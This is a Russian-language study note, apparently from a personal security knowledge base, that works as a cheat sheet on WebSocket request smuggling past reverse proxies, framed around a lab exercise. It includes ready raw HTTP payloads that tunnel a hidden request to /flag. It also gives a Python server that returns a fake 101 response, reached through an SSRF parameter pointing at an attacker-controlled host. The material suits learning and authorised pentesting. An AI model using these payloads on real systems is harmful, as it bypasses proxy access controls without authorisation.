---
title: "Шпаргалка по WebSocket Smuggling (внедрение через WebSocket-туннели)"
id: note-59
created: "24.06.2026 16:16"
category: "04_HTTP и десинхронизация"
tags:
  - иб/http
  - desync
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `04_HTTP и десинхронизация` · Дата: `24.06.2026 16:16`

# Шпаргалка по WebSocket Smuggling (внедрение через WebSocket-туннели)

1. Основы WebSocket
Протокол WebSocket обеспечивает двунаправленную связь между браузером и сервером через долгоживущее соединение.
Установка: клиент отправляет HTTP-запрос с заголовками:
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64>
Sec-WebSocket-Version: 13 (обычно)
Сервер при поддержке отвечает 101 Switching Protocols, после чего соединение переключается на WebSocket-протокол.
Прокси-серверы часто не обрабатывают upgrade самостоятельно, а ретранслируют его на бэкенд и после успешного ответа 101 туннелируют весь дальнейший трафик без проверки.

2. Суть уязвимости (Smuggling через WebSocket)
Если прокси не проверяет ответ бэкенда на upgrade и считает, что соединение всегда становится WebSocket, можно внедрить HTTP-запросы через этот туннель.
Для этого отправляется запрос с некорректной версией WebSocket (например, Sec-WebSocket-Version: 777).
Бэкенд отвечает 426 Upgrade Required – upgrade не происходит, соединение остаётся HTTP.
Прокси, не проверив ответ, всё равно переводит соединение в режим туннеля (думая, что это WebSocket).
Последующие данные (второй запрос) проходят через туннель и обрабатываются бэкендом как обычный HTTP, обходя фильтры прокси.

3. Первый сценарий: прокси без проверки (Varnish)
Уязвимый прокси не анализирует ответ сервера на upgrade.
Payload:
text
GET /socket HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target.com
Важно: два перевода строки после последнего заголовка.
Отправлять через Burp Repeater с отключённой опцией Update Content-Length.
При успехе получаем содержимое /flag, несмотря на запрет прокси.
Если нет конечной точки /socket, можно использовать любой путь (например, /), потому что прокси всё равно не проверяет ответ. Пример:
text
GET / HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target.com
В этом случае также работает, если прокси доверяет любым upgrade-заголовкам.

4. Второй сценарий: прокси с проверкой (Nginx)
Nginx проверяет ответ сервера: если не получен код 101, туннель не создаётся, и внедрение не работает.
Чтобы обойти это, нужно заставить бэкенд вернуть поддельный ответ 101.
Это возможно, если в приложении есть SSRF (Server-Side Request Forgery), позволяющая проксировать запросы на контролируемый атакующим сервер.

5. Использование SSRF для подделки 101
Находим эндпоинт, который делает запрос по указанному URL и возвращает статус ответа (например, /check-url?server=<url>).
Запускаем свой веб-сервер, который на любой GET-запрос отвечает кодом 101 и завершает заголовки (без тела).
Пример Python-сервера:
python
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"
        self.send_response(101)
        self.end_headers()
HTTPServer(('', 5555), Handler).serve_forever()
Формируем payload для /check-url с указанием нашего сервера в параметре server и добавляем заголовки upgrade:
text
GET /check-url?server=http://<attacker_ip>:5555 HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target.com
Отправляем через Burp (два перевода строки в конце).
Прокси получает ответ от нашего сервера с кодом 101 и считает upgrade успешным, туннелирует второй запрос.
Бэкенд, получив второй запрос, обрабатывает его как HTTP, потому что реального WebSocket нет, и возвращает содержимое /flag.

6. Ключевые моменты и нюансы
Burp Repeater: обязательно отключить Update Content-Length, иначе Burp изменит длину и сломает атаку.
Переводы строк: в конце payload обязательно ставить два \r\n (пустая строка). В Burp это две пустые строки после последнего заголовка.
Не работает с первого раза: иногда требуется несколько попыток, особенно с Burp. Альтернатива – использовать nc (netcat) для отправки сырого запроса, что надёжнее.
SSRF-сервер: должен отвечать именно кодом 101, без тела. Важно, чтобы ответ содержал только заголовки и завершался пустой строкой.
Обход ограничений: эта техника позволяет обойти фильтры прокси (доступ к /flag, /admin и т.п.), но не влияет на запросы других пользователей (только туннелирование своих запросов).

7. Применение в пентесте
Используется, когда прокси ограничивает доступ к определённым путям, но разрешает upgrade-заголовки.
Проверяем наличие эндпоинта с SSRF для подделки 101, если прокси проверяет ответы.
Если SSRF нет, а прокси не проверяет ответы – достаточно отправить любой upgrade-запрос с неверной версией.
Всегда пробуем как с корректной версией (13), так и с некорректной, в зависимости от поведения.

8. Примеры готовых payloads
Для прокси без проверки (Varnish):
text
GET /socket HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target.com

Для прокси с проверкой + SSRF:
text
GET /check-url?server=http://attacker:5555 HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target.com

Если нет /socket – используем /:
text
GET / HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target.com


9. Инструменты
Burp Suite Repeater – для ручной отправки с отключённым Update Content-Length.
Netcat (nc) – для стабильной отправки без искажений.
Python-скрипт для поддельного сервера с ответом 101.
Возможные готовые утилиты для автоматизации, но в комнате используется ручной подход.

10. Резюме
WebSocket smuggling – техника обхода прокси-фильтров путём создания фиктивного WebSocket-туннеля. Основной вектор – отправка upgrade-запроса с невалидной версией, чтобы прокси туннелировал последующие HTTP-запросы, не проверяя их. Если прокси проверяет ответ, требуется SSRF для подделки ответа 101. Техника эффективна для доступа к скрытым ресурсам, но не влияет на других пользователей. При тестировании важно точно соблюдать формат запросов и следить за переводом строк.
